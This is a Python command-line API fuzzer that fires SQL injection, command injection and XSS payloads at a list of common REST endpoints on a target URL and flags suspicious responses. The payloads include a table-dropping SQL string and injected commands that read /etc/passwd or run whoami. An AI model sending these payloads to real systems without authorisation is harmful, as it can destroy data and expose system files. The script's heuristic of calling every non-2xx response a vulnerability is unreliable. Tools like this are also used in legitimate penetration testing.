import argparse
import logging
import requests
import sys
from urllib.parse import urljoin, urlparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define common API endpoints (extend as needed)
COMMON_API_ENDPOINTS = [
    "/api/v1/users",
    "/api/v1/products",
    "/api/v1/orders",
    "/api/v1/items",
    "/api/auth/login",
    "/api/auth/register",
    "/api/search"
]

# Define fuzzing payloads for different vulnerability types
FUZZING_PAYLOADS = {
    "sql_injection": [
        "1' OR '1'='1",
        "1' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "\" OR \"1\"=\"1",
        "\" OR \"1\"=\"1\" --"
    ],
    "command_injection": [
        "; ls -la",
        "; whoami",
        "; cat /etc/passwd",
        "| ls -la",
        "| whoami",
        "| cat /etc/passwd"
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>"
    ]
}

def setup_argparse():
    """
    Sets up the argument parser for the command-line interface.

    Returns:
        argparse.ArgumentParser: The configured argument parser.
    """
    parser = argparse.ArgumentParser(description="Fuzzes API endpoints with various payloads to identify vulnerabilities.")
    parser.add_argument("base_url", help="The base URL of the API to fuzz (e.g., http://example.com)")
    parser.add_argument("-e", "--endpoints", nargs="+", help="Specific endpoints to fuzz (optional, overrides common endpoints)")
    parser.add_argument("-p", "--payloads", nargs="+", choices=FUZZING_PAYLOADS.keys(),
                        help="Specific payload types to use (optional, default is all)")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Request timeout in seconds (default: 5)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output (debug logging)")
    return parser

def is_valid_url(url):
    """
    Checks if a given string is a valid URL.

    Args:
        url (str): The string to check.

    Returns:
        bool: True if the string is a valid URL, False otherwise.
    """
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def fuzz_endpoint(base_url, endpoint, payload_type, payloads, timeout):
    """
    Fuzzes a specific API endpoint with the given payloads.

    Args:
        base_url (str): The base URL of the API.
        endpoint (str): The endpoint to fuzz.
        payload_type (str): The type of payload being used (for logging).
        payloads (list): A list of payloads to use for fuzzing.
        timeout (int): The request timeout in seconds.
    """
    for payload in payloads:
        url = urljoin(base_url, endpoint)
        data = {"param": payload}  # Example: Assuming a parameter named 'param'
        headers = {"Content-Type": "application/json"}  # Adjust as needed
        
        try:
            logging.debug(f"Fuzzing URL: {url} with payload: {payload}")
            response = requests.post(url, json=data, headers=headers, timeout=timeout)

            logging.debug(f"Response Status Code: {response.status_code}")
            logging.debug(f"Response Content: {response.text}")

            if response.status_code < 200 or response.status_code >= 300:
                logging.warning(f"Possible vulnerability detected at {url} with {payload_type} payload: {payload}")
                logging.warning(f"Status Code: {response.status_code}, Response: {response.text}")
            elif payload in response.text:
                 logging.warning(f"Possible reflected XSS vulnerability detected at {url} with {payload_type} payload: {payload}")
                 logging.warning(f"Status Code: {response.status_code}, Response: {response.text}")
            

        except requests.exceptions.RequestException as e:
            logging.error(f"Error during request to {url}: {e}")

def main():
    """
    Main function to execute the API endpoint fuzzer.
    """
    parser = setup_argparse()
    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Input validation: Base URL
    if not is_valid_url(args.base_url):
        logging.error("Invalid base URL provided.")
        sys.exit(1)

    base_url = args.base_url.rstrip("/")  # Remove trailing slash

    # Determine endpoints to fuzz
    endpoints = args.endpoints if args.endpoints else COMMON_API_ENDPOINTS

    # Determine payload types to use
    payload_types = args.payloads if args.payloads else FUZZING_PAYLOADS.keys()

    # Iterate through endpoints and payload types
    for endpoint in endpoints:
        for payload_type in payload_types:
            if payload_type in FUZZING_PAYLOADS:
                fuzz_endpoint(base_url, endpoint, payload_type, FUZZING_PAYLOADS[payload_type], args.timeout)
            else:
                logging.error(f"Invalid payload type: {payload_type}")

    logging.info("Fuzzing completed.")


if __name__ == "__main__":
    main()

# Example Usage:
# python vuln-API-Endpoint-Fuzzer.py http://example.com
# python vuln-API-Endpoint-Fuzzer.py http://example.com -e /api/v1/users /api/v1/products
# python vuln-API-Endpoint-Fuzzer.py http://example.com -p sql_injection xss
# python vuln-API-Endpoint-Fuzzer.py http://example.com -t 10
# python vuln-API-Endpoint-Fuzzer.py http://example.com -v